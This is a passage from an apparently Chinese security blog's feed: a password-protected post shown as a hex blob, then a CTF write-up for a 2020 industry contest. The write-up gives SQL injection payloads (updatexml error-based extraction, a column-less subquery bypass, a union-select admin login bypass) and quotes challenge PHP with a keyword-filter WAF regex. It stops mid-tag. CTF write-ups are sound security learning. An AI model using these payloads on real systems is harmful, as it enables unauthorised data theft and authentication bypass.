83dd1361d25196caf3afee66689c2e3f06822690ae14e9f35cd59ca9180923fba856ea8b9d489f9444fb96684094c3ab97bf86c41a303cf5e9f8d89092c86a34b4e6ec1efd31f00ffdeaadfe4dea025b3bacd3142bebeacbcc159f9cc43ef89564adb81ffdad4f6d0de44a60e0025b04dc423c10755829089fb113be6a1d36207e50c6402d1b2841ce2da1ccbdd13b8c875597cfa4f122c95648e842cb2c2d9c22d8e3fdc9c94b3035f72ee045e12597263ada6d1b3801863706d469f49b2318f600639e006e2e70bc94986761a971854598b885d6de957723fc4e1c7e07fa345ac5eba1cfc6979017d08dc0945f7fd4e12a645200d344cff90e99aef16500bbe8e9081b08c22a9e19a3f43b11b8a2d748bb2ffcda546e0c43761451cf6f7ca36070306d7b1a1904faf345861279ad5f25ee491837bc9a4fbfceb48a0197ebccd1b2f1783ac74db045acce97efcdc7c2f0829fcf190dcbdddadb9485da9a8d375780d1e4233d9ce15c9f0dedc3af31201c8d0664ea077de7e8a691c4cd84aa2be7fa4689d21a53569349213264a5f4d3ff67c3725d7821ba0f07f9abd1c4a96518236de5ecb899c27e34493ef2b5686bf18b710b0320b015f5a54eecb662a9105ea21ead41148748712e6c7a83cd8e333e389e85da4ec2c1811ff91ab72bf0b95c43110dccef76c7d5bcc4c4d21ee6bce6a50bf384ec63a44f489984010359f408ef237af2e0d0aff34073a2fe6619295ee445ef20ecea82904793c26e17e3f2aeb0190e08c14db5c758b9a62fe08eb21b3d75ddec102e568c1470847e3574b505b03c5f3df30f8f2696b16e8c3a2b1bbd95242ce0970502d2786df90db1330d55ef44d740d5ba2cdbbdcaefb3f15236ab5d473812fa4ffa23feeffac3af850ca1c403924364b53211144891cb942c5307574f08b8bcd9b73e20dab46a7166c5ad64431d9dbb098afa04f3dd7074b631cd614dd02c167110be8eb99eb8c29550816f4c82dc7079dddc2165bea122dc065786f9ba9833b67d884feaa5f135dd24129f81efd9177ae1d3689559156d2d21704fdf56e7cb4c4a71f70166d889609f21feefff069f7d395c34ff1a33d5b512d0a9329c3364e59d76be27d582c2061ca18856a6bde169e23bf4e3b171ae550e89cead15d2589ac56becb34cc5301ef75bf403572dee065d7c387c0025ef7e5bdd41e15526eb2fb127b0d57676749f170ef548095624bd2330ab8e9d589078edf5c91ab0fe1209d56fe05333ce6594448ff7bac986cccd18ceeea41dc172e8584fba271ba0be5e6ac302d2fcbd558bdafd02f063a3d0d838d5993f5a26f57c243fd3db620b28e6b6c6374f7993e4d6dc3b3f6188cd128b6787e0cd88d41a23e93ea23ce7bc051735afbb34215dd784d74ba72746ae5256a57469be34bcc7a4e840684dcc7535fa6487c8052fb801d4b3e6832df1ed3ed637c743a811b7aa6f426f1d1227c9b415ccbbfa7b3345bf4671caae08c1e3301ca84c77824300f31af5ba60645ad4c9cbbae1fec2b0e40571322467869f590d757d50b493f73a9f74b5bc65e212422b0f3d83a966455fd7b2310b1795a38a427521ed15b09258a72f393312f201930584ed98681cca21ce7a5e62e91d3068da3bcd46a544f2cce9f20eeeb910e6f3286e5b964d946bac5472773a0c142b8d3fa29c7629e22df9e60dcf57b94df7548e1f16f72a591b036c3baacccb9a4f924698bb93611ceb9d7c7ba55ef2c70623ebc5edeca2be53175b7e1a47bbc70fee25154c83eb007fd92ff4a09fa80737c2ae0f616371ad4b8e08d168182ba7dc84275c0b915089810281a6c9dcd5477ae5983749ab39f85351baf929c67bfff5fc9ac92354f91f8f77c05965d37537232170faf3bbf00961ae2931434bc036ff33a831208d80714ca5f5ee97aa0e55dec2643f1de9688d70ac418a4866a5ff645035f4d9aead69995b83e476e9cc5b68b37f483837544e285b426c1c8046e550aa869be2a0991ea87680979441fb590d28b7ad984df3d111c0f055ad00bb4c640ee0242dc06631d1746d2d9cce65fc29b390d6698731b08d202de1f7a9219fdf32c484bcc45661fd4b6c664e6447dc85a57d907e93ec1dcd9ebee383a79d9a56cacb50d35ca5e5890903186f348747fb869dbe71a5bfecc5c00408a1681c73471fe57929e98624a05eec53efc76d150fb38ea9fc9b44bcbb8dbe1130e7390574e502018f4783be4d5d2086935ea3247385996d1cc08c1e6af2a796a014edbfef3b312962f31e8fdb758592f4672d890e643fc1523a1b1fac2d5d8117d91d48fca9de86028edb91e9fbbd1b47789a652d9f9ba1695cfc0a9fe9f3c44b3b8db10a511b7100f40a13f660d3fbc4f19e2bd32c985f960607208daccc2b3ab40b0a5b69940fc385d4488890a951da72fd20099bf866d6ba97a66ae1be800c4e2d836162859cde950b2be8aa1d39a4510dd9fddc7c0ccca75faed80e71b4a0a67d5f9a558d929c61e68e27895e72e85a0680b6b6d152eac2b1276469f8e8510e1e6bf4de3b1e920471942fed4c3e362e1b789cbe0d41095a217ebf370b6a0cb85f9d8d5d844e53fd427ff3e6af687f78c36ad31b4d700db5aac2e09cbfc772a9f032eab2b283bed1d39843324fc3d459b136f5708049a35e1a2329a875533c99d646c29e0e74183e8b779053e0c584a8c9cd9169db46a3d3f6330d8c150b5b18e843c3332a271f9287ae865c7dacb2fc8b27d2ba2e50f4bc22b55afa50b79f4533d7f3ee7baaa36651b45f827a431d39f98a59802ac020874f6af9b117bf60c1b51fa47f688bb4b9b7fda95ba1e851257489f85066cb9dcdb658dc0207c7c2f4ca0fcf12c1e9b92e6086ff6ed364c3ec2a9888e026c49b6b8c3a6b941e9c66804d634316db73fa43a6106dc0adea999b81b0fa261de97d42e1b4baa4fc082d0dd288714ba4bd001ea8e63eafbdf075662ca1a6ff99f685a236fd769028ed72632235d370f38ebfaa72be5cbc8c35065d9357d3c25e7ac3e909d502eb7ae36412d0c9f82983e0e6cc27d31b0331b938f10f65cc675298dc687df98a52bfec6a48bb3f1cb1f07e75862147942d96b3741b24fadcd375e49601db795d4769df25e4811302d9412bc9d021501b9127f151f70afa28ab2ed749985a76e329ee26433fd7586b8beb40b34d98c7c5cd533f4777dd1e6cf9a338bff404b91eb3c15052781f801b99cdf22d3ff5ba59797bf2d6ce9ce0e2445856c14d3917a938cfe51ebcb2ecb3035fced0e6d5757fd07542eab8af51465776928b1b26721422d9e04508fd3412106726ad2c4d61571eb1ed5cc4b689dfece6b0724094e729709867ef71666f2067fdfc0e0a6e56b7dd91cb177e5dd6414ffecc5ff82e312239916cff4c20d75ad8f0d5fa8bb2ce02fa21702a50da2ddbd8f0c5b758753476aa6851341b7778a1194cad14e0169d6cc7e224735fcd93eca461efdc7f4effa49d0132dad5f6e64e1674a4f44bb69208334de8f108e4cf7f3ba948c72ee05504b1bac0f239fac39d54a9b8319ddf6783cd1d38e72a26c0155f0dd20ef05be575e8432c284241257bc5d982d166a9cfccb147d0eecc5e30aaaf7a06a3089bcf7ad074fcd27cde9e555eecb7451ad290b07c0607a40cb968ea849b44baa27af7d79cade4cf38f8bea23544c5e041b1e5b8bb09909cc10d8694452ab334c57e1906da922870b36698bc08b1dbf7c1f826064b433e6f003e24585a0c6bb723b4745cdf0aed029ebaa79d10a591d8d1fb7d4fcbab35860eb93c8de1f02dbcf2c1b9df4178c9dcb717612d5b34febed2143bc6ae794f5848ebf8bc593dab8c2e503554bda28117db707bdc958156aa5c6d6baa909cd58c6166d4c275ef393be27149e5c5c9b459e7b8e3c362a70924feb9c81882226ea4eabecbebf8398fa44571464c4ef0a8adea1cb60c6f3a9691fafdc922f20c93bc3e15711875a190065cacbb7cfd5aa90e7dfd0e624bc6ab9cc857baf03f246691ddcf5f1f089440f594117eedc435cfcdf7ed839d92b1eecdc37b5aedf03ab148efbfcc99fead4923cff43557cd105a250e75ba27cdc483a78734dc1060a38afae9ab2af7b0dd09e8788b46437e07492514ea55d91cb0f671b8964d02e9915322459a1329c8c6805d8bec5b69a7a3efda964fb86cd52bb69b0c6c663eec5ace8d724cfcee9f0bb620f8464fa4ba4970ff862efde6f374ec2e30b275f52d2541611337aceca7ec7438bb119e809bb58ceaf406de078f64cea8ad4ad460fdf29090d03160b077fd175136dcab12f24b7c42fabc21c314cd55ce02b367019f9e190072f046a4f983b469a11f7fb881aa3c7791114eeb04fe4421a4779fba6f00e199d1b6f6f276dd9fc614bf5a4f4d2ec2bd7f4db00192b83148b294fba03835111f55c5ac2d0f7f902a19ab6b356b940a5cc395be68eca7a48ad01938e5ab3ad6b775513146e8edd92f0ba40c7e31e0c235ebb38f9b6d83546b70f2f730ff24a76091b58471804646ee21aa006fa9e160c56ca2f1be4f35145e911646bbbdd27e509c7bfbd67b1e32645f9127f0c1131bee510e5a34e475d4054cb72b59dc63775aeae85ec35a8fd6592e39c9fca7eae7178a2baede646e4343ef10be7b63b9950754b5f4f14b9859dc8c3d611c16611a87459da8f9054496d269114847adf9f096029be61ba42a2208098fca224ab84c4d33a3ad35093ab711ba9431d95b4af526d6dcbeb7bc698621cefb1428fb9e5c8b12aa6c2634ef75d0fa4de67297774a893bbd99d5a34bfb0faa2974462c1016f82e64c6d1b317feddbce5697010de988c14557e24f74e91fd109bf0b5960d055109b8d2fd23b453572299bab31c688657a764d4cc91cc7c6b08f8518ff3da0fd064c802ec7ab1ebb8f0d32167a3d79e9ff72652b8d830f346b24c88dc0673b275c1f26b33c4bbbb4bfc239229a434154e67dc18272cc20e4ffcc06fcbecfc57c3d8540d96d3d33814bd3759232b9c1aa47f9ad99d5d42eb215bd10f891805bf3afd9f6d437eb74dc32a8d0494af3640227bcd421af332f53b4d6e12ebe36dd0c2e8c31a7daa433d7a1a76035fa0dd80b5ee0564a4c46660e7faaccb34c7bc67bcab940cd51e2d078d92ac0f589716aa2e431bbdacbef013b66ed484b505fdf57845c2b8155e157326a35a9d7f9a061721c17636eedb2ef720a8889f1b5fb19adbe514f11070de252d5a2db9e5636171c7845e81095f5c480ea438c29b47e080af426b8c8558799feaebc4574b6bd0d55fbce820114db9ed76cbe55f6d576fff48620c866b17e7de559f4287cf7fccef00382bb03f7150a97bbe76e1d10f5519119cce1cd3a8369349f1ba83ff479d8635465668b3a6444919a113adf88a5afb795239ef4ea5a9578e705ad71b81d39ae453d44b607c1cb0e7f5c475e40766ca83d843e641c68436f0ebe687d1ede92f60b5d82faeab95025b49dc7a3b017b8e8379a9a110f1532ef9cd10bd1f6201495ac3cf60ba30fd63386566b4d9681b2bfb374fbf75f962b0855a2bd4e3728e0ec57da795ec5beecd25ace14aa3c2da95ab2fa24a67acc82c757c4f0986ecd6093a51ec4bf0381cc2d7ab51c909d92b059e73295c6a45e25530cb78bb1721b7925241903965e9dc4b285dca6625f6ae7ce72f8083303de20b9dcb4e864a87877d92ff38b6ff1b322a4094ace443b15d192b15f034477c0bcad8be1fdd6f47487e4f1f148155fca4e322316568a47e8bd5a8103a0d3812db5b4aca480739e83bcb4ed510cedb974ef148a5a87d8c2b1a05d9e10f251b2f8e01a9252102119b10cc498688cf5aaf8b47fc631fce2dc2af7eebc0c67d3b0deb29b011e27f7ee4db75222042739f8c821509de821de467d8ec948ef69861f47ad02461b4483d7f409ecd879797f3f3a851a1fd5eb78024defa23ed2935d22479394bc5e6a4048bef0ba1c97192be597ae772c4a2e7808b7c5bec236bdf68fc7e5327e3dadbc3ed8a09f7d6565788d1786ebfb0f9e4f37bc398cefb37e7c814bbc01491885df91f7833e7b21204718504a8dac38a4559d59756e19ec31dd50387b68c49503bef4e1d58802c94bf89823dab6a6d203d8c153f290f39c5c6289b2459a71a22849823ae19e487ec1a1d1e08273cc2844f1fac96616f0ecb2491ca774d5fc93002b141a3af508d78b10dbbc27f262826714138bcec9186981269c57d2c9398b50cfc3f1a9a48d433e069f8a39356edc40dde30dd491d3672e172f4c1a5c227db226d2145cb34e211d29076d0844f21431056e01be0ecb99a680f4b5bc4778bd3434cc433d62240d1ca54f8adf42c20b86dc0c3b8387f1507016b429136920f870b6e7d9f4557f89b5eb6d26af88c2986e3899554410fa30ae5934bf2918e4c6a55e81d8469a15fa9242fe51866e2eb051b4b2502e261db8bb7120249f31e1dc7b6f4c6d2ccb58e72e7e62ecfaecbbf1137f5a0f925664fc263e48c2c340b976815dcdbd795e4576022e6e434a14014725ce90a36fa1f02ea0b20f3746b8910b46973eb07c7852adb20edbb547dbd926ed9156a98b1e77ea4804e22c4dbbec9f1708afcc18d6cfe6f6749a75a8dc3a5b38399115d606ceefbfea65fdb4a3318c8f49817b32987b2b44531736e57c9ad52e57e5ab95d1c93a08d7adbc431f9637d08b564c8da20cfa9c4ec1ec7541563d38ff1525e62b529fb1c355406373fa2e9015a915bc2dd223638ee3af3fb91658e67e2ff5c7a1617c55f97266ecae712c3b18ebe6ff8b8de85709ac7886deea6eece8a2ad9fe1a356d21476a5b875ca9b7e4d69751842d98414a6e88114b8dfa10742c723cb874ae6282bbcc649b2fc31a5e7c4ede6e9b2a9176b29ba7964a1239ef4cd7d7f0a519298a8bd5f0cc91d228bf0a4e6fe1c8ed1048d50b4eec0590ac14b749514f2734fe21aae8517e9ce283f4b8b930ab1f458058b12b0eae467e0587317ae23ffc3bc9c4643d63cd344a65541d8e60b8f36d481120033c4119ef311d3d5ae61f56b0dfecd9ce280dff2d2ea1f1b832b23ff3bfb1b9b807fe819b118bf99b71e9bd43cfb64a8969eede9ebb9184fc2799f15f769d0f892fcf06611ae0788e097246010f12c3248753d193d2eed64b46097ec2c7a94ef2857ac93b7ad3526cffd9f02e08bad09651eb4b10f23fcc1a2f05981feef40d251802ab112a50da8b6437a76eba9f4e3dcdc2aa624bb6678f21c589436c31f1ed868c047e135bd3d6fdaff7b3fb1d54ae34c1a85e0f3f4ae3018e6439e1a469228dea1f5904cb2404ffb7c8143bf155cc082fad48d27da5c7d340abc7ff3e1082953497b87b50218f42469cd3611bee70ea83be4c2186562f121b8f3db33d35a2c6c883bea7ffc3c021eb01083abf9f7fb9ebd390e938a3166977d08d19d56ba854de8699fe2b8ab85d3871c5f4c0d4c99da0e40db70074a2eb77a904cb1737b4b7aadfb54ba9c4e0c9ba77e6474ed6d96d68ac5e88f83aeaa2446d0fc921e0b9f90b73cb8e5cd951de84d85c26e4e78e78c1aef0c763d7818a63f6bea55b389b15584cb0c0cfac51a42bb2024e189afc7f6b7c6242205a44b8344f87d1c5c89ea926840ccfac5d225272ddcc8de3256ffe6f84dcbd9d92494607313de8286ad822df89cb7f06d4077a1ea137e190b698f754831b307641f774e336a8a69f6041fc7215dfda47c76a5ef2ab418c3e2e48f1c15b41a2387154c27a1f7c5eb525b159283f10b96f049ffa82449b4830732b2e93afa6ad4968582f4fcda4f1fc36a5781f440d2a82ba2d2818780d585d37158466625307fec503d7775c652f64d835f14d6717081a05de8f5a0c44783939778f49f0099dc9475186a6464401ba812b7298b6d2fd4d4bfe0ca80383da0de62d6b5c534851ee9af175fd2792c424639c9634a0592d14d30fc4368f934e3bcf14208020cd77255e2a5ee0fa2c7f799be537dff355b0897c350985ea43e3c2883df68cba593b9fee81b7a434e2a6da33ea57e4d571a04719051d883d3bea65d2c2fea1f1e053b45966806eef26e46dd20c2be9d25bf51071a71f9172850bcf97bbb20fab48d55e876ecbeac3c39f2e581aa2daea16f026fc62fae938cadd4cb923e17df43efa752cda009e9c94f26d81fc71df1e3dd2836dfd9af3d875f36a421ad7f49198518c5aeee19cfc7db3d4cb10f59700b26c13f9c185724315b0e54e8c18a6388a64b79390369449d70959745d9e2bec991956cc498773b1c332544be1383aebb6738621c79b67db1d82061b55ee5864e33e78c2cf985d3e328e9f35b31a0cccb45110fa77b86906222a13e0f1ebc38be8c659e96adda431b58a79dc81ac2a3a4a835629eca99c3742336608a42fbac166a36933c0b56c3efee0f0f62592afb229c5bf18a495a98460491d2d426f94b9dd3136c6ed0d8e26ce57ee0a8b9f75d0107128d608ca1ffcfc8f5b7090bab52c74ef7adf3914327cf238598781c47e60a71cd7904d35d51b9da57f7a733ac83c28c4ee3886bb6dcc39bbc25cf1ab0f995e00ecabe84d28b09d8e41aad898d052bbe7c82ff51744a0d422d168c16b6a4b02bc731fdf164cd945da942e3203b6bdeb4184dce2928795ca91425f671f37a62fbb6bb1dcc34329a85de5b9ac011cd946c2937a240b3b6e872993ccf8bdbd762dcc776b32e755d16ba9bf5375927fcd6e22bc5e09cb88d9937ab007d3db62e22b2d6bb5a8b303d8b692347250cd7b9c17fcfbff26b47ec93f8d661a8b3490d84d13a384396f403c5c61646d15cb5300e4543dd85785bf769a5f9b9322f5bd54c8524905beeff6123266b8567d4d55dc98b36190cf93d6b9ae1913ba76518a0a7f98f742bcc806b36984235c26139250b205acc196aacc2a7bd05a3a2a0ffd4ab792645db719412f18939fd0823e77809a2540513fcc0968ec905944f4435a42301c984cf32de7b2b76d248f51508e7a58572fd35709cfb44e37dbd7cd9942ec1672293ce1e2013e4c67d9eca8c8df179ce2bf0de8b2c610b797719d434fe92938911423207913fa9622b360ca7bc6276398af9bffabd349977bf764e0b78b50bc45120c9680e87d56a7ed3a0931b08e62d367786397ef092ff98cf3088e219f843d73c4a9bf8effbcaec48582a63869763142e6d85cfe18ed9207e5e56720df5ef2751abade145a416046fc8433bbe919020d2ae9fbd500f1334105099c91602ff42818bd6807be9971217ec927558b70fcaa1bd84f0b730d5057e8815c2c684a8ea6a5cad58f436602eb8a46018e1585ebe6a0c0186c699522787f58ce76986c2f1aacfdb03f4d097d291527032088f9adb6e2cb3f0029342f8633c25c7190eb147e64011a3b2aa0830eac51b12725547ffcaaaca0dd359bb8702c98aba2301eb3d2074bc8233c2f410cf144b2ffb25d2cd3dff26cce3c92fdfc4dd4566d2d19983f1a3f00aaac13b37444d186a7a62f6a0dde20d2134fe7c086e9d155f5644c6966279186824411e11a8bf850c1d84dbe27fe62f7642948b8d1140d6daff7588ed2c0e14fcf7282dd46c2c7411a276a819855e62f4f73b1899789492f99afd47ffea423735e597483b2033d0e49156dcfd85b4252d6b42209c2509a54af5695f2b442bb699a1ebd77dcc0ab93c68f6f2388d3275fd3d4919af5e834d9eaef1f5b4a1b588cf66760f8b67802e5cdf2dc8164bba150841445654102df591cdc652bf6d5899f8b82baf2c1647933692e32f26ed742529084bbec97cf461ac62b16b53900f8c89c2649682b2ddf900efe5956b54b0a1bdab97649cb40583285c3cf6591818729b98bc67a613630ed0a6f1320f6d04f99fa7b6d38899897f588b21fc414b00c2827f1f01f88d91904ba6b3ebcbe651ec9a9c2ed2b9fbfa384baef3e14550e147810593841fff4daf323d5a4b1559365ec9d69a63dcebed658e7b92dd42b6e1ee1f68c91b8122cea131ba8f6cfb80aa7d9cab3ad5acefe7f360a2645312000f93007531ec4221fedf22de38d90b1df73feb94be6ca5a092c9999faf685e155de4a63ec0c7b9f46fdd355e8e3e106386fea65183ed41b70f9be467c0d1b8af3ea85690267520e5ba0387795a4c63d57dd61f9f029ea81bf3e19b5e0967e351643dd183bbc40df802e64ad60b82961a4705d462021d65055680d17df67fe87d406fe1f183b82119bbf1eea1a3e063648ff096b7179dd90ca8fbc67949956971055949822b989088cc360b9f8e20f222bc7b790d195995ece696f01f74497e7b5db94af7143024d7d947ae9532bc923f8174e62c0563493f844c90cf00a2fc321e2ce8069357e92a4053d534df276512b258ca0f159d61ddee1d9cfd3442266b95b395036bfebc2dda9fef03b3020ad52cc5b4a1a7863876ea94e1dd8caaa8cf6806a99ec449f63036927bdaa063ad2c3d4d54cade3062d970851893c01ceeeea8dbdb7f4861b9d74530e8bbb92dab601b081d079cb6098046c261e4e68f52a61e64915436484956e078bc25eed1b4ccdfc7527e9ca443de2a22ef8240b2947d81c21ba9d93095c74c0a2835ff3d9360440e53463a79d84934a814d7523bf76a501ed82c4c0adb6064df7e0ae4bae3592a6af435b75f947233e7d7bfcb41fa91c70c0c8e1a821cf93f5d772b56c6da23c79cef16c5ee7a452217d65f6320085634804e6ed80f46052f02539a4734543c6211e0162890542c7da5d488b3b23000afc0d3426f157a70dc0c5962aa01e345fa2aa7e3ab5b4cda54846f55384f905572bc5e110fdb32c4319b5b78be3b331f62a3e48767d3e43e5093eb1256dc8e0799c4917c4a3dae98abfcd5bf5a8165a3af343a7cae0048438d651f02dd0b7b9da54c7f2ab30f2b4fd4d11593d2205fb3a29b488308d3a227e6ec17143d75f8608d4d97b5de962ce3648e0b879ecbc62562b27fa9b042a98007f902ba9a4481fa00517d961533502e18b83b56dc6e7286f2f64483d1a27e61ec7fc038d0149dbd37c51522769518a6578f3fdc50aaa1492c292911d823fa8d67215ca23da42fe0a4b36ef4b3a2f1cdf167d5636e4e2d0d90637e668aa8d307965ad7d64489f70c1cc772d0390531b6d088a720f21c4f4bd15dc7d75f703823adae2f6889fb2fa4c0bb0f88829dd8a2a1eccb5f59283ee9255c8a521d6b3eab165bcb2c8e088f22ccd75ecb6bdf8a7b6aa782bf3cd588c6685a6f422b76c21ad33c7d1312033f4fed09970747e1c346653486c399e827bbe16c3864eda54d4003ff9be6c7a917d61b45b76afa52a390d20ce589cfa90c6e53956aceda0f401f91410f7e38a58b3d201077490101aa715968284dade14d057e942597195669549f5a39f497e55509c26df363019366692316e656020f932b61da3e8ad96c8595c25b79d89f8e2c0d09d8b9069a2a337888fc3fac40460a2d44f95fde32530b83d300158936292265941beab4664839b40c152fbd4138de1842b720aed9545f9ecf6c6135367ff5f07c054e51cd764345537d87fc68d3ef5799dfd355f214250b737099b14bc12d5c8fc32327d4c8f46b7651bbee9468f449dc422ac02fc69b48f449d8087c0f31ff063f2d8f7c317f36860b0e789cdaa7025fc99f98c401a593ca9081535b0800331c4cbe449b4baa33dd42a898f84c7c8afc181efdbc03f556c51287528a0a0032505a49670f2c97d46177a5bbc10e8a5d670121ce0ea42c96d7c3c9ce69b875aea34321141d9e8fb77383819991f1bacb39d5e435e6f5c054f73c93c64432fc1d7a5608743263c4bdf5931dac20ca3233bcf0c7cbd0e6330ca225beecda6432be19f9de0e083d01526ccf0e57a72b67193b8a76364c8b2eb6905a31de55517cda18bb60a5c28030ab01c9d20de86e54a759769b4d3d8c6763bdf5d308296ce82a02629dc4fde7d6036e39657c96aab12a47c0f3b5aee4ba42c798800bffc8268c70bc2a877a4947d7a8d6fd829669eb3cce71463184a41d01413236c20bb713ea0cb7716bd32fa80429ea98fdefa62240cdf2f1fec2fb4e8b7a453960fcd54af9e81425afd171a03b86dc0aa2a0691de972ec854a21f5aa767a97681eca78d0898b122d652a8c0ff50fd39b4be6ef2e707d77ee3620c7bbeff6b1a285c22c456a9f7938ae4535a0cbf5a7c8689254f49f5e231cb20571619f232780be867014adc4130f1d595c8510aa2671b70c73c48c4650c8d8b6a9a7236e1969ffebcfe8c927dfba23f106532077ccb3e45ebb7ab1e18b6115e788cb0646181118d2499bf7271bb09c4e4eb4da800c5d357fec1da6d28a20222b4b96d59e3767ff37fef7fe78712bcd1090878ce40013eb1b748f621e0a8e6c23f8526232b5369f857bc92c8034689e9e3d52627b5dc</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2020全国电信和互联网行业网络安全竞赛wp</title>
    <link href="https://c1aysec.github.io/2020/12/07/2020%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bwp/"/>
    <id>https://c1aysec.github.io/2020/12/07/2020全国电信和互联网行业网络安全竞赛wp/</id>
    <published>2020-12-07T09:24:36.060Z</published>
    <updated>2020-12-08T04:45:26.907Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序"><a href="#序" class="headerlink" title="序"></a>序</h1><p>补一下，11月份的比赛，太忙一直没时间更新</p><h3 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h3><p>很明显的注入，但是过滤了一些关键字，比如information、sys等，导致获取不到表名</p><p>通过：</p><pre><code>uname=1&apos;) and updatexml(1,concat(0x3a,(select * from flag)),1);-- -&amp;passwd=1</code></pre><p>可以发现存在名为flag表，并且可以获取到里面的数据</p><p><img src="http://pic.c1imber.top/blog/20201207/ATMFj13IU8MU.png?imageslim" alt="mark"></p><p>但是updatexml这种报错注入方式显示的信息有长度限制，而且这里不知道flag表当中flag的列名，关于无列名注入的问题，直接用子查询就能绕过</p><p>获取完整的flag:</p><pre><code>uname=1&apos;) and updatexml(1,concat(0x3a,(select x.1 from (select * from (select 1)a union select * from flag limit 1,1)x)),1);-- -&amp;passwd=1</code></pre><p><img src="http://pic.c1imber.top/blog/20201207/mt78Vtm8W73S.png?imageslim" alt="mark"></p><pre><code>uname=1&apos;) and updatexml(1,concat(0x3a,(select substr(x.1,32) from (select * from (select 1)a union select * from flag limit 1,1)x)),1);-- -&amp;passwd=1</code></pre><p><img src="http://pic.c1imber.top/blog/20201207/AkK4A2mQk6U5.png?imageslim" alt="mark"></p><p>拼接获得完整的flag:</p><p>flag{c7651cb673c911ee8f9977094a220f17}</p><h3 id="ezsqli"><a href="#ezsqli" class="headerlink" title="ezsqli"></a>ezsqli</h3><p>通过<a href="http://121.36.224.156:2333/?hint可以查看提示的代码" target="_blank" rel="external">http://121.36.224.156:2333/?hint可以查看提示的代码</a>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"> <span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//a "part" of the source code here  </span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqlWaf</span><span class="params">($s)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    $filter = <span class="string">'/xml|extractvalue|regexp|copy|read|file|select|between|from|where|create|grand|dir|insert|link|substr|mid|server|drop|=|&gt;|&lt;|;|"|\^|\||\ |\'/i'</span>;</div><div class="line">    <span class="keyword">if</span> (preg_match($filter,$s))</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span>;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">True</span>;</div><div class="line">&#125;   </div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</div><div class="line">    </div><div class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'VerifyCode'</span>]))</div><div class="line">            <span class="keyword">die</span>(<span class="string">"?"</span>);   </div><div class="line"></div><div class="line">    $username = strval($_POST[<span class="string">'username'</span>]);</div><div class="line">    $password = strval($_POST[<span class="string">'password'</span>]); </div><div class="line"></div><div class="line">    <span class="keyword">if</span> ( !sqlWaf($password) )</div><div class="line">        alertMes(<span class="string">'damn hacker'</span> ,<span class="string">"./index.php"</span>); </div><div class="line"></div><div class="line">    $sql = <span class="string">"SELECT * FROM users WHERE username='$&#123;username&#125;' AND password= '$&#123;password&#125;'"</span>;</div><div class="line"><span class="comment">//    password format: /[A-Za-z0-9]/</span></div><div class="line">    $result = $conn-&gt;query($sql);</div><div class="line">    <span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>) &#123;</div><div class="line">        $row = $result-&gt;fetch_assoc();</div><div class="line">        <span class="keyword">if</span> ( $row[<span class="string">'username'</span>] === <span class="string">'admin'</span> &amp;&amp; $row[<span class="string">'password'</span>] )</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span> ($row[<span class="string">'password'</span>] == $password)</div><div class="line">            &#123;</div><div class="line">                $message = $FLAG;</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                $message = <span class="string">"username or password wrong, are you admin?"</span>;</div><div class="line">            &#125;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            $message = <span class="string">"wrong user"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $message = <span class="string">"user not exist or wrong password"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;   </div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>查看代码，看到存在<code>sqlWaf</code>函数，该waf函数只对<code>$_POST[password]</code>参数做了检测</p><p>通过代码还能看到获取flag的条件，需要<code>SELECT * FROM users WHERE username=&#39;$_POST[username]&#39; AND password= &#39;$_POST[password]&#39;</code>查询出的<code>$row[&#39;username&#39;]</code>为admin，并且<code>$row[&#39;password&#39;]</code>等于<code>$_POST[password]</code></p><p>这里构造</p><pre><code>username=&apos; union select 1,&quot;admin&quot;,&quot;1&quot;-- -&amp;password=1&amp;captcha=图形验证码</code></pre><p>就可以满足要求，此时sql执行的结果为：<code>$row[&#39;username&#39;]</code>为admin，<code>$row[&#39;password&#39;]</code>为1，<code>$row[&#39;password&#39;]</code>和<code>$_POST[&#39;password&#39;]</code>相等</p><p><img src="http://pic.c1imber.top/blog/20201207/QRBQRHCj6uG8.png?imageslim" 